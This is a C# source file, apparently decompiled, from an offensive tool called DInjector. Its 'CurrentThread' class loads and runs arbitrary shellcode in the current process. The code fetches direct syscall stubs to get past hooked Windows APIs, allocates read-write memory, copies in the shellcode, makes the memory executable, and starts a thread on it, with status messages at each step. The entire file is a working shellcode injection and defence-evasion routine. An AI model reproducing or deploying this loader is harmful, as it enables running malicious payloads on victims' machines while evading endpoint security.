// DInjector, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// DInjector.CurrentThread
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using DInjector;
using DInvoke.Data;
using DInvoke.DynamicInvoke;

internal class CurrentThread
{
	[UnmanagedFunctionPointer(CallingConvention.StdCall)]
	private delegate DInvoke.Data.Native.NTSTATUS NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

	[UnmanagedFunctionPointer(CallingConvention.StdCall)]
	private delegate DInvoke.Data.Native.NTSTATUS NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

	[UnmanagedFunctionPointer(CallingConvention.StdCall)]
	private delegate DInvoke.Data.Native.NTSTATUS NtCreateThreadEx(out IntPtr threadHandle, Win32.WinNT.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList);

	[UnmanagedFunctionPointer(CallingConvention.StdCall)]
	private delegate DInvoke.Data.Native.NTSTATUS NtWaitForSingleObject(IntPtr ObjectHandle, bool Alertable, uint Timeout);

	public static void Execute(byte[] shellcodeBytes)
	{
		NtAllocateVirtualMemory obj = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtAllocateVirtualMemory"), typeof(NtAllocateVirtualMemory));
		IntPtr BaseAddress = IntPtr.Zero;
		IntPtr RegionSize = (IntPtr)shellcodeBytes.Length;
		DInvoke.Data.Native.NTSTATUS nTSTATUS = obj(Process.GetCurrentProcess().Handle, ref BaseAddress, IntPtr.Zero, ref RegionSize, Win32.Kernel32.MEM_COMMIT | Win32.Kernel32.MEM_RESERVE, 4u);
		if (nTSTATUS == DInvoke.Data.Native.NTSTATUS.Success)
		{
			Console.WriteLine("(CurrentThread) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
		}
		else
		{
			Console.WriteLine($"(CurrentThread) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {nTSTATUS}");
		}
		Marshal.Copy(shellcodeBytes, 0, BaseAddress, shellcodeBytes.Length);
		nTSTATUS = ((NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtProtectVirtualMemory"), typeof(NtProtectVirtualMemory)))(Process.GetCurrentProcess().Handle, ref BaseAddress, ref RegionSize, 32u, out var _);
		if (nTSTATUS == DInvoke.Data.Native.NTSTATUS.Success)
		{
			Console.WriteLine("(CurrentThread) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
		}
		else
		{
			Console.WriteLine($"(CurrentThread) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {nTSTATUS}");
		}
		NtCreateThreadEx obj2 = (NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtCreateThreadEx"), typeof(NtCreateThreadEx));
		IntPtr threadHandle = IntPtr.Zero;
		nTSTATUS = obj2(out threadHandle, Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, Process.GetCurrentProcess().Handle, BaseAddress, IntPtr.Zero, createSuspended: false, 0, 0, 0, IntPtr.Zero);
		if (nTSTATUS == DInvoke.Data.Native.NTSTATUS.Success)
		{
			Console.WriteLine("(CurrentThread) [+] NtCreateThreadEx");
		}
		else
		{
			Console.WriteLine($"(CurrentThread) [-] NtCreateThreadEx: {nTSTATUS}");
		}
		nTSTATUS = ((NtWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtWaitForSingleObject"), typeof(NtWaitForSingleObject)))(threadHandle, Alertable: false, 0u);
		if (nTSTATUS == DInvoke.Data.Native.NTSTATUS.Success)
		{
			Console.WriteLine("(CurrentThread) [+] NtWaitForSingleObject");
		}
		else
		{
			Console.WriteLine($"(CurrentThread) [-] NtWaitForSingleObject: {nTSTATUS}");
		}
	}
}
